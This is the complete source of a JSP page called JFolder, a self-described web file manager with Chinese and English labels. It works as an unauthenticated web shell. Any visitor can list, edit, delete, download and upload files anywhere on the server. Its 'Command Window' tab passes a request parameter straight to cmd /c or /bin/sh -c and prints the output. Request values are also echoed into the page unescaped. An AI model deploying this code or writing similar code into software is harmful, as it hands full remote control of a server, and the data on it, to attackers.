<%@page errorPage="/"%>
<%@page contentType="text/html;charset=gb2312"%>
<%@page import="java.io.*,java.util.*,java.net.*" %>
<%!
private final static int languageNo=1; //Language,0 : Chinese; 1:English
String strThisFile="JFileMan.jsp";
String strSeparator = File.separator;
String[] authorInfo={" <font color=red> 写的不好，将就着用吧 - - by 慈勤强 http://www.topronet.com </font>"," <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>"};
String[] strFileManage   = {"文 件 管 理","File Management"};
String[] strCommand      = {"CMD 命 令","Command Window"};
String[] strSysProperty  = {"系 统 属 性","System Property"};
String[] strHelp         = {"帮 助","Help"};
String[] strParentFolder = {"上级目录","Parent Folder"};
String[] strCurrentFolder= {"当前目录","Current Folder"};
String[] strDrivers      = {"驱动器","Drivers"};
String[] strFileName     = {"文件名称","File Name"};
String[] strFileSize     = {"文件大小","File Size"};
String[] strLastModified = {"最后修改","Last Modified"};
String[] strFileOperation= {"文件操作","Operations"};
String[] strFileEdit     = {"修改","Edit"};
String[] strFileDown     = {"下载","Download"};
String[] strFileCopy     = {"复制","Move"};
String[] strFileDel      = {"删除","Delete"};
String[] strExecute      = {"执行","Execute"};
String[] strBack         = {"返回","Back"};
String[] strFileSave     = {"保存","Save"};

public class FileHandler
{
	private String strAction="";
	private String strFile="";
	void FileHandler(String action,String f)
	{
	
	}
}

public static class UploadMonitor {

		static Hashtable uploadTable = new Hashtable();

		static void set(String fName, UplInfo info) {
			uploadTable.put(fName, info);
		}

		static void remove(String fName) {
			uploadTable.remove(fName);
		}

		static UplInfo getInfo(String fName) {
			UplInfo info = (UplInfo) uploadTable.get(fName);
			return info;
		}
}

public class UplInfo {

		public long totalSize;
		public long currSize;
		public long starttime;
		public boolean aborted;

		public UplInfo() {
			totalSize = 0l;
			currSize = 0l;
			starttime = System.currentTimeMillis();
			aborted = false;
		}

		public UplInfo(int size) {
			totalSize = size;
			currSize = 0;
			starttime = System.currentTimeMillis();
			aborted = false;
		}

		public String getUprate() {
			long time = System.currentTimeMillis() - starttime;
			if (time != 0) {
				long uprate = currSize * 1000 / time;
				return convertFileSize(uprate) + "/s";
			}
			else return "n/a";
		}

		public int getPercent() {
			if (totalSize == 0) return 0;
			else return (int) (currSize * 100 / totalSize);
		}

		public String getTimeElapsed() {
			long time = (System.currentTimeMillis() - starttime) / 1000l;
			if (time - 60l >= 0){
				if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";
				else return time / 60 + ":0" + (time % 60) + "m";
			}
			else return time<10 ? "0" + time + "s": time + "s";
		}

		public String getTimeEstimated() {
			if (currSize == 0) return "n/a";
			long time = System.currentTimeMillis() - starttime;
			time = totalSize * time / currSize;
			time /= 1000l;
			if (time - 60l >= 0){
				if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";
				else return time / 60 + ":0" + (time % 60) + "m";
			}
			else return time<10 ? "0" + time + "s": time + "s";
		}

	}

	public class FileInfo {

		public String name = null, clientFileName = null, fileContentType = null;
		private byte[] fileContents = null;
		public File file = null;
		public StringBuffer sb = new StringBuffer(100);

		public void setFileContents(byte[] aByteArray) {
			fileContents = new byte[aByteArray.length];
			System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
		}
}

// A Class with methods used to process a ServletInputStream
public class HttpMultiPartParser {

		private final String lineSeparator = System.getProperty("line.separator", "\n");
		private final int ONE_MB = 1024 * 1;

		public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,
				int clength) throws IllegalArgumentException, IOException {
			if (is == null) throw new IllegalArgumentException("InputStream");
			if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(
					"\"" + boundary + "\" is an illegal boundary indicator");
			boundary = "--" + boundary;
			StringTokenizer stLine = null, stFields = null;
			FileInfo fileInfo = null;
			Hashtable dataTable = new Hashtable(5);
			String line = null, field = null, paramName = null;
			boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);
			boolean isFile = false;
			if (saveFiles) { // Create the required directory (including parent dirs)
				File f = new File(saveInDir);
				f.mkdirs();
			}
			line = getLine(is);
			if (line == null || !line.startsWith(boundary)) throw new IOException(
					"Boundary not found; boundary = " + boundary + ", line = " + line);
			while (line != null) {
				if (line == null || !line.startsWith(boundary)) return dataTable;
				line = getLine(is);
				if (line == null) return dataTable;
				stLine = new StringTokenizer(line, ";\r\n");
				if (stLine.countTokens() < 2) throw new IllegalArgumentException(
						"Bad data in second line");
				line = stLine.nextToken().toLowerCase();
				if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(
						"Bad data in second line");
				stFields = new StringTokenizer(stLine.nextToken(), "=\"");
				if (stFields.countTokens() < 2) throw new IllegalArgumentException(
						"Bad data in second line");
				fileInfo = new FileInfo();
				stFields.nextToken();
				paramName = stFields.nextToken();
				isFile = false;
				if (stLine.hasMoreTokens()) {
					field = stLine.nextToken();
					stFields = new StringTokenizer(field, "=\"");
					if (stFields.countTokens() > 1) {
						if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {
							fileInfo.name = paramName;
							String value = stFields.nextToken();
							if (value != null && value.trim().length() > 0) {
								fileInfo.clientFileName = value;
								isFile = true;
							}
							else {
								line = getLine(is); // Skip "Content-Type:" line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Position to boundary line
								continue;
							}
						}
					}
					else if (field.toLowerCase().indexOf("filename") >= 0) {
						line = getLine(is); // Skip "Content-Type:" line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Position to boundary line
						continue;
					}
				}
				boolean skipBlankLine = true;
				if (isFile) {
					line = getLine(is);
					if (line == null) return dataTable;
					if (line.trim().length() < 1) skipBlankLine = false;
					else {
						stLine = new StringTokenizer(line, ": ");
						if (stLine.countTokens() < 2) throw new IllegalArgumentException(
								"Bad data in third line");
						stLine.nextToken(); // Content-Type
						fileInfo.fileContentType = stLine.nextToken();
					}
				}
				if (skipBlankLine) {
					line = getLine(is);
					if (line == null) return dataTable;
				}
				if (!isFile) {
					line = getLine(is);
					if (line == null) return dataTable;
					dataTable.put(paramName, line);
					// If parameter is dir, change saveInDir to dir
					if (paramName.equals("dir")) saveInDir = line;
					line = getLine(is);
					continue;
				}
				try {
					UplInfo uplInfo = new UplInfo(clength);
					UploadMonitor.set(fileInfo.clientFileName, uplInfo);
					OutputStream os = null;
					String path = null;
					if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,
							fileInfo.clientFileName));
					else os = new ByteArrayOutputStream(ONE_MB);
					boolean readingContent = true;
					byte previousLine[] = new byte[2 * ONE_MB];
					byte temp[] = null;
					byte currentLine[] = new byte[2 * ONE_MB];
					int read, read3;
					if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {
						line = null;
						break;
					}
					while (readingContent) {
						if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {
							line = null;
							uplInfo.aborted = true;
							break;
						}
						if (compareBoundary(boundary, currentLine)) {
							os.write(previousLine, 0, read - 2);
							line = new String(currentLine, 0, read3);
							break;
						}
						else {
							os.write(previousLine, 0, read);
							uplInfo.currSize += read;
							temp = currentLine;
							currentLine = previousLine;
							previousLine = temp;
							read = read3;
						}//end else
					}//end while
					os.flush();
					os.close();
					if (!saveFiles) {
						ByteArrayOutputStream baos = (ByteArrayOutputStream) os;
						fileInfo.setFileContents(baos.toByteArray());
					}
					else fileInfo.file = new File(path);
					dataTable.put(paramName, fileInfo);
					uplInfo.currSize = uplInfo.totalSize;
				}//end try
				catch (IOException e) {
					throw e;
				}
			}
			return dataTable;
		}

		/**
		 * Compares boundary string to byte array
		 */
		private boolean compareBoundary(String boundary, byte ba[]) {
			byte b;
			if (boundary == null || ba == null) return false;
			for (int i = 0; i < boundary.length(); i++)
				if ((byte) boundary.charAt(i) != ba[i]) return false;
			return true;
		}

		/** Convenience method to read HTTP header lines */
		private synchronized String getLine(ServletInputStream sis) throws IOException {
			byte b[] = new byte[1024];
			int read = sis.readLine(b, 0, b.length), index;
			String line = null;
			if (read != -1) {
				line = new String(b, 0, read);
				if ((index = line.indexOf('\n')) >= 0) line = line.substring(0, index - 1);
			}
			return line;
		}

		public String getFileName(String dir, String fileName) throws IllegalArgumentException {
			String path = null;
			if (dir == null || fileName == null) throw new IllegalArgumentException(
					"dir or fileName is null");
			int index = fileName.lastIndexOf('/');
			String name = null;
			if (index >= 0) name = fileName.substring(index + 1);
			else name = fileName;
			index = name.lastIndexOf('\\');
			if (index >= 0) fileName = name.substring(index + 1);
			path = dir + File.separator + fileName;
			if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);
			else return path.replace('/', File.separatorChar);
		}
} //End of class HttpMultiPartParser

String formatPath(String p)
{
	StringBuffer sb=new StringBuffer();
	for (int i = 0; i < p.length(); i++) 
	{
		if(p.charAt(i)=='\\')
		{
			sb.append("\\\\");
		}
		else
		{
			sb.append(p.charAt(i));
		}
	}
	return sb.toString();
}

	/**
	 * Converts some important chars (int) to the corresponding html string
	 */
	static String conv2Html(int i) {
		if (i == '&') return "&amp;";
		else if (i == '<') return "&lt;";
		else if (i == '>') return "&gt;";
		else if (i == '"') return "&quot;";
		else return "" + (char) i;
	}

	/**
	 * Converts a normal string to a html conform string
	 */
	static String htmlEncode(String st) {
		StringBuffer buf = new StringBuffer();
		for (int i = 0; i < st.length(); i++) {
			buf.append(conv2Html(st.charAt(i)));
		}
		return buf.toString();
	}
String getDrivers()
/**
Windows系统上取得可用的所有逻辑盘
*/
{
	StringBuffer sb=new StringBuffer(strDrivers[languageNo] + " : ");
	File roots[]=File.listRoots();
	for(int i=0;i<roots.length;i++)
	{
		sb.append(" <a href=\"javascript:doForm('','"+roots[i]+strSeparator+"','','','1','');\">");
		sb.append(roots[i]+"</a>&nbsp;");
	}
	return sb.toString();
}
static String convertFileSize(long filesize)
{
	//bug 5.09M 显示5.9M
	String strUnit="Bytes";
	String strAfterComma="";
	int intDivisor=1;
	if(filesize>=1024*1024)
	{
		strUnit = "MB";
		intDivisor=1024*1024;
	}
	else if(filesize>=1024)
	{
		strUnit = "KB";
		intDivisor=1024;
	}
	if(intDivisor==1) return filesize + " " + strUnit;
	strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor ;
	if(strAfterComma=="") strAfterComma=".0";
	return filesize / intDivisor + "." + strAfterComma + " " + strUnit;
}
%>
<%
request.setCharacterEncoding("gb2312");
String tabID = request.getParameter("tabID");
String strDir = request.getParameter("path");
String strAction = request.getParameter("action");
String strFile = request.getParameter("file");
String strPath = strDir + strSeparator + strFile; 
String strCmd = request.getParameter("cmd");
StringBuffer sbEdit=new StringBuffer("");
StringBuffer sbDown=new StringBuffer("");
StringBuffer sbCopy=new StringBuffer("");
StringBuffer sbSaveCopy=new StringBuffer("");
StringBuffer sbNewFile=new StringBuffer("");
String strOS = System.getProperty("os.name").toLowerCase();
//out.print(strPath);
if((tabID==null) || tabID.equals(""))
{
	tabID = "1";
}

if(strDir==null||strDir.length()<1)
{
	strDir = request.getRealPath(".");
}


if(strAction!=null && strAction.equals("down"))
{
	File f=new File(strPath);
	if(f.length()==0)
	{
		sbDown.append("文件大小为 0 字节，就不用下了吧");
	}
	else
	{
		response.setHeader("content-type","text/html; charset=ISO-8859-1");
		response.setContentType("APPLICATION/OCTET-STREAM");	
		response.setHeader("Content-Disposition","attachment; filename=\""+f.getName()+"\"");
		FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());
		out.clearBuffer();
		int i;
		while ((i=fileInputStream.read()) != -1)
		{
			out.write(i);	
		}
		fileInputStream.close();
		out.close();
	}
}

if(strAction!=null && strAction.equals("del"))
{
	File f=new File(strPath);
	f.delete();
}

if(strAction!=null && strAction.equals("edit"))
{
	File f=new File(strPath);	
	BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));
	sbEdit.append("<form name='frmEdit' action='' method='POST'>\r\n");
	sbEdit.append("<input type=hidden name=action value=save >\r\n");
	sbEdit.append("<input type=hidden name=path value='"+strDir+"' >\r\n");
	sbEdit.append("<input type=hidden name=file value='"+strFile+"' >\r\n");
	sbEdit.append("<input type=submit name=save value=' "+strFileSave[languageNo]+" '> ");
	sbEdit.append("<input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'> &nbsp;"+strPath+"\r\n");
	sbEdit.append("<br><textarea rows=30 cols=90 name=content>");
	String line="";
	while((line=br.readLine())!=null)
	{
		sbEdit.append(htmlEncode(line)+"\r\n");		
	}
   sbEdit.append("</textarea>");
	sbEdit.append("<input type=hidden name=path value="+strDir+">");
	sbEdit.append("</form>");
}

if(strAction!=null && strAction.equals("save"))
{
	File f=new File(strPath);
	BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));
	String strContent=request.getParameter("content");
	bw.write(strContent);
	bw.close();
}
if(strAction!=null && strAction.equals("copy"))
{
	File f=new File(strPath);
	sbCopy.append("<br><form name='frmCopy' action='' method='POST'>\r\n");
	sbCopy.append("<input type=hidden name=action value=savecopy >\r\n");
	sbCopy.append("<input type=hidden name=path value='"+strDir+"' >\r\n");
	sbCopy.append("<input type=hidden name=file value='"+strFile+"' >\r\n");
	sbCopy.append("原始文件： "+strPath+"<p>");
	sbCopy.append("目标文件： <input type=text name=file2 size=40 value='"+strDir+"'><p>");
	sbCopy.append("<input type=submit name=save value=' "+strFileCopy[languageNo]+" '> ");
	sbCopy.append("<input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'> <p>&nbsp;\r\n");
	sbCopy.append("</form>");
}
if(strAction!=null && strAction.equals("savecopy"))
{
	File f=new File(strPath);
	String strDesFile=request.getParameter("file2");
	if(strDesFile==null || strDesFile.equals(""))
	{
		sbSaveCopy.append("<p><font color=red>目标文件错误。</font>");
	}
	else
	{
		File f_des=new File(strDesFile);
		if(f_des.isFile())
		{
			sbSaveCopy.append("<p><font color=red>目标文件已存在,不能复制。</font>");
		}
		else
		{
			String strTmpFile=strDesFile;
			if(f_des.isDirectory())
			{
				if(!strDesFile.endsWith(strSeparator))
				{
					strDesFile=strDesFile+strSeparator;
				}
				strTmpFile=strDesFile+"cqq_"+strFile;
			 }
			
			File f_des_copy=new File(strTmpFile);
			FileInputStream in1=new FileInputStream(f);
			FileOutputStream out1=new FileOutputStream(f_des_copy);
			byte[] buffer=new byte[1024];
			int c;
			while((c=in1.read(buffer))!=-1)
			{
				out1.write(buffer,0,c);
			}
			in1.close();
			out1.close();
	
			sbSaveCopy.append("原始文件 ："+strPath+"<p>");
			sbSaveCopy.append("目标文件 ："+strTmpFile+"<p>");
			sbSaveCopy.append("<font color=red>复制成功！</font>");			
		}		
	}	
	sbSaveCopy.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=返回>");
}
if(strAction!=null && strAction.equals("newFile"))
{
	String strF=request.getParameter("fileName");
	String strType1=request.getParameter("btnNewFile");
	String strType2=request.getParameter("btnNewDir");
	String strType="";
	if(strType1==null)
	{
		strType="Dir";
	}
	else if(strType2==null)
	{
		strType="File";
	}
	if(!strType.equals("") && !(strF==null || strF.equals("")))
	{		
			File f_new=new File(strF);			
			if(strType.equals("File") && !f_new.createNewFile())
				sbNewFile.append(strF+" 文件创建失败");
			if(strType.equals("Dir") && !f_new.mkdirs())
				sbNewFile.append(strF+" 目录创建失败");
	}
	else
	{
		sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
	}
}

if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith("multipart")))
{
	String tempdir=".";
	boolean error=false;
	response.setContentType("text/html");
	HttpMultiPartParser parser = new HttpMultiPartParser();

	int bstart = request.getContentType().lastIndexOf("oundary=");
	String bound = request.getContentType().substring(bstart + 8);
	int clength = request.getContentLength();
	Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);
	if (ht.get("cqqUploadFile") != null)
	{

		FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
		File f1 = fi.file;
		UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
		if (info != null && info.aborted) 
		{
			f1.delete();
			request.setAttribute("error", "Upload aborted");
		}
		else 
		{
			String path = (String) ht.get("path");
			
			if(path!=null && !path.endsWith(strSeparator)) 
				path = path + strSeparator;
				strDir = path;
			//out.println(path + f1.getName());
			if (!f1.renameTo(new File(path + f1.getName()))) 
			{
				request.setAttribute("error", "Cannot upload file.");
				out.println("error,upload ");
				error = true;
				f1.delete();
			}
		}
	}
}
%>
<html>
<head>
<style type="text/css">
td,select,input,body{font-size:9pt;}
A { TEXT-DECORATION: none }

#tablist{
padding: 5px 0;
margin-left: 0;
margin-bottom: 0;
margin-top: 0.1em;
font:9pt;
}

#tablist li{
list-style: none;
display: inline;
margin: 0;
}

#tablist li a{
padding: 3px 0.5em;
margin-left: 3px;
border: 1px solid ;
background: F6F6F6;
}

#tablist li a:link, #tablist li a:visited{
color: navy;
}

#tablist li a.current{
background: #EAEAFF;
}

#tabcontentcontainer{
width: 100%;
padding: 5px;
border: 1px solid black;
}

.tabcontent{
display:none;
}

</style>

<script type="text/javascript">

var initialtab=[<%=tabID%>, "menu<%=tabID%>"]

////////Stop editting////////////////

function cascadedstyle(el, cssproperty, csspropertyNS){
if (el.currentStyle)
return el.currentStyle[cssproperty]
else if (window.getComputedStyle){
var elstyle=window.getComputedStyle(el, "")
return elstyle.getPropertyValue(csspropertyNS)
}
}

var previoustab=""

function expandcontent(cid, aobject){
if (document.getElementById){
highlighttab(aobject)
if (previoustab!="")
document.getElementById(previoustab).style.display="none"
document.getElementById(cid).style.display="block"
previoustab=cid
if (aobject.blur)
aobject.blur()
return false
}
else
return true
}

function highlighttab(aobject){
if (typeof tabobjlinks=="undefined")
collecttablinks()
for (i=0; i<tabobjlinks.length; i++)
tabobjlinks[i].style.backgroundColor=initTabcolor
var themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcolor
aobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor
}

function collecttablinks(){
var tabobj=document.getElementById("tablist")
tabobjlinks=tabobj.getElementsByTagName("A")
}

function do_onload(){
collecttablinks()
initTabcolor=cascadedstyle(tabobjlinks[1], "backgroundColor", "background-color")
initTabpostcolor=cascadedstyle(tabobjlinks[0], "backgroundColor", "background-color")
expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])
}

if (window.addEventListener)
window.addEventListener("load", do_onload, false)
else if (window.attachEvent)
window.attachEvent("onload", do_onload)
else if (document.getElementById)
window.onload=do_onload



</script>
<script language="javascript">

function doForm(action,path,file,cmd,tab,content)
{
	document.frmCqq.action.value=action;
	document.frmCqq.path.value=path;
	document.frmCqq.file.value=file;
	document.frmCqq.cmd.value=cmd;
	document.frmCqq.tabID.value=tab;
	document.frmCqq.content.value=content;
	if(action=="del")
	{
		if(confirm("确定要删除文件 "+file+" 吗？"))
		document.frmCqq.submit();
	}
	else
	{
		document.frmCqq.submit();    
	}
}
</script>

<title>JFoler 1.0 ---A jsp based web folder management tool by Steven Cee</title>
<head>


<body>

<form name="frmCqq" method="post" action="">
<input type="hidden" name="action" value="">
<input type="hidden" name="path" value="">
<input type="hidden" name="file" value="">
<input type="hidden" name="cmd" value="">
<input type="hidden" name="tabID" value="2">
<input type="hidden" name="content" value="">
</form>

<!--Top Menu Started-->
<ul id="tablist">
<li><a href="http://www.topronet.com" class="current" onClick="return expandcontent('menu1', this)"> <%=strFileManage[languageNo]%> </a></li>
<li><a href="new.htm" onClick="return expandcontent('menu2', this)" theme="#EAEAFF"> <%=strCommand[languageNo]%> </a></li>
<li><a href="hot.htm" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"> <%=strSysProperty[languageNo]%> </a></li>
<li><a href="search.htm" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"> <%=strHelp[languageNo]%> </a></li>
 &nbsp; <%=authorInfo[languageNo]%>
</ul>
<!--Top Menu End-->


<%
StringBuffer sbFolder=new StringBuffer("");
StringBuffer sbFile=new StringBuffer("");
try
{
	File objFile = new File(strDir);
	File list[] = objFile.listFiles();	
	if(objFile.getAbsolutePath().length()>3)
	{
		sbFolder.append("<tr><td >&nbsp;</td><td><a href=\"javascript:doForm('','"+formatPath(objFile.getParentFile().getAbsolutePath())+"','','"+strCmd+"','1','');\">");
		sbFolder.append(strParentFolder[languageNo]+"</a><br>- - - - - - - - - - - </td></tr>\r\n ");


	}
	for(int i=0;i<list.length;i++)
	{
		if(list[i].isDirectory())
		{
			sbFolder.append("<tr><td >&nbsp;</td><td>");
			sbFolder.append("  <a href=\"javascript:doForm('','"+formatPath(list[i].getAbsolutePath())+"','','"+strCmd+"','1','');\">");
			sbFolder.append(list[i].getName()+"</a><br></td></tr> ");
		}
		else
		{
		    String strLen="";
			String strDT="";
			long lFile=0;
			lFile=list[i].length();
			strLen = convertFileSize(lFile);
			Date dt=new Date(list[i].lastModified());
			strDT=dt.toLocaleString();
			sbFile.append("<tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"><td>");
			sbFile.append(""+list[i].getName());	
			sbFile.append("</td><td>");
			sbFile.append(""+strLen);
			sbFile.append("</td><td>");
			sbFile.append(""+strDT);
			sbFile.append("</td><td>");

			sbFile.append(" &nbsp;<a href=\"javascript:doForm('edit','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileEdit[languageNo]+"</a> ");

			sbFile.append(" &nbsp;<a href=\"javascript:doForm('del','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileDel[languageNo]+"</a> ");

			sbFile.append("  &nbsp;<a href=\"javascript:doForm('down','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileDown[languageNo]+"</a> ");

			sbFile.append("  &nbsp;<a href=\"javascript:doForm('copy','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileCopy[languageNo]+"</a> ");
		}		

	}	
}
catch(Exception e)
{
	out.println("<font color=red>操作失败： "+e.toString()+"</font>");
}
%>

<DIV id="tabcontentcontainer">


<div id="menu3" class="tabcontent">
<br> 
<br> &nbsp;&nbsp; 未完成<%=strOS%>
<br> <%
//Properties prop = new Properties(System.getProperties());  
//prop.list(out);
%>

<br>&nbsp;

</div>

<div id="menu4" class="tabcontent">
<br>
<p>一、功能说明</p>
<p>&nbsp;&nbsp;&nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、</p>
<p>删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似</p>
<p>与windows的cmd。</p>
<p>&nbsp;</p>
<p>二、测试</p>
<p>&nbsp;&nbsp;&nbsp;<b>请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，<p>
留言地址为：<a href="http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx" target="_blank">http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx</a></b>
<p>&nbsp;</p>
<p>三、更新记录</p>
<p>&nbsp;&nbsp;&nbsp; 2004.11.29&nbsp; V1.0测试版发布，修正了Linux系统上的一些问题，在Linux系统上也可以使用。</p>
<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能</p>
<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能</p>
<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; 第一个jsp&nbsp;程序就是这个简单的显示目录文件的小程序</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</div>


<div id="menu1" class="tabcontent">
<%
out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder[languageNo]+"： <b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table><br>\r\n");
%>
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
       
        <tr> 
          <td width="25%" align="center" valign="top"> 
              <table width="98%" border="0" cellspacing="0" cellpadding="3">
 				<%=sbFolder%>
                </tr>                 
              </table>
          </td>
          <td width="81%" align="left" valign="top">
	
	<%
	if(strAction!=null && strAction.equals("edit"))
	{
		out.println(sbEdit.toString());
	}
	else if(strAction!=null && strAction.equals("copy"))
	{
		out.println(sbCopy.toString());
	}
	else if(strAction!=null && strAction.equals("down"))
	{
		out.println(sbDown.toString());
	}
	else if(strAction!=null && strAction.equals("savecopy"))
	{
		out.println(sbSaveCopy.toString());
	}
	else if(strAction!=null && strAction.equals("newFile") && !sbNewFile.toString().equals(""))
	{
		out.println(sbNewFile.toString());
	}
	else
	{
	%>
		<span id="EditBox"><table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" >
              <tr bgcolor="#E7e7e6"> 
                <td width="26%"><%=strFileName[languageNo]%></td>
                <td width="19%"><%=strFileSize[languageNo]%></td>
                <td width="29%"><%=strLastModified[languageNo]%></td>
                <td width="26%"><%=strFileOperation[languageNo]%></td>
              </tr>              
            <%=sbFile%>
             <!-- <tr align="center"> 
                <td colspan="4"><br>
                  总计文件个数：<font color="#FF0000">30</font> ，大小：<font color="#FF0000">664.9</font> 
                  KB </td>
              </tr>
			 -->
            </table>
			</span>
	<%
	}		
	%>

          </td>
        </tr>

	<form name="frmMake" action="" method="post">
	<tr><td colspan=2 bgcolor=#FBFFC6>
	<input type="hidden" name="action" value="newFile">
	<input type="hidden" name="path" value="<%=strDir%>">
	<input type="hidden" name="file" value="<%=strFile%>">
	<input type="hidden" name="cmd" value="<%=strCmd%>">
	<input type="hidden" name="tabID" value="1">
	<input type="hidden" name="content" value="">
	<%
	if(!strDir.endsWith(strSeparator))
	strDir = strDir + strSeparator;
	%>
	<input type="text" name="fileName" size=36 value="<%=strDir%>">
	<input type="submit" name="btnNewFile" value="新建文件" onclick="frmMake.submit()" > 
	<input type="submit" name="btnNewDir" value="新建目录"  onclick="frmMake.submit()" > 
	</form>		
	<form name="frmUpload" enctype="multipart/form-data" action="" method="post">
	<input type="hidden" name="action" value="upload">
	<input type="hidden" name="path" value="<%=strDir%>">
	<input type="hidden" name="file" value="<%=strFile%>">
	<input type="hidden" name="cmd" value="<%=strCmd%>">
	<input type="hidden" name="tabID" value="1">
	<input type="hidden" name="content" value="">
	<input type="file" name="cqqUploadFile" size="36">
	<input type="submit" name="submit" value="上传">
	</td></tr></form>
      </table>
</div>
<div id="menu2" class="tabcontent">

<%
String line="";
StringBuffer sbCmd=new StringBuffer("");

if(strCmd!=null) 
{
	try
	{
		//out.println(strCmd);
		String[] strShell=new String[2];
		if(strOS.startsWith("win"))
		{
			strShell[0]="cmd";
			strShell[1]="/c";
		}
		else
		{
			strShell[0]="/bin/sh";	
			strShell[1]="-c";
		}
		String[] strCommand=new String[3];
		strCommand[0]=strShell[0];
		strCommand[1]=strShell[1];
		strCommand[2]=strCmd;
		System.out.println(strCommand);
		Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));
		BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
		while((line=br.readLine())!=null)
		{
			sbCmd.append(line+"\r\n");		
		}    
	}
	catch(Exception e)
	{
		System.out.println(e.toString());
	}
}
else
{
	strCmd = "set";
}

%>
<form name="cmd" action="" method="post">
&nbsp;
<input type="text" name="cmd" value="<%=strCmd%>" size=50>
<input type="hidden" name="tabID" value="2">
<input type="hidden" name="path" value="<%=strDir%>">
<input type=submit name=submit value="<%=strExecute[languageNo]%>">
</form>
<%
if(sbCmd!=null && sbCmd.toString().trim().equals("")==false)
{
%>
&nbsp;<TEXTAREA NAME="cqq" ROWS="20" COLS="100%"><%=sbCmd.toString()%></TEXTAREA>
<br>&nbsp;
<%
}
%>
</DIV>
</div>
<br><br>
<center><a href="http://www.topronet.com" target="_blank">www.topronet.com</a> ,All Rights Reserved.
<br>Any question, please email me cqq1978@Gmail.com
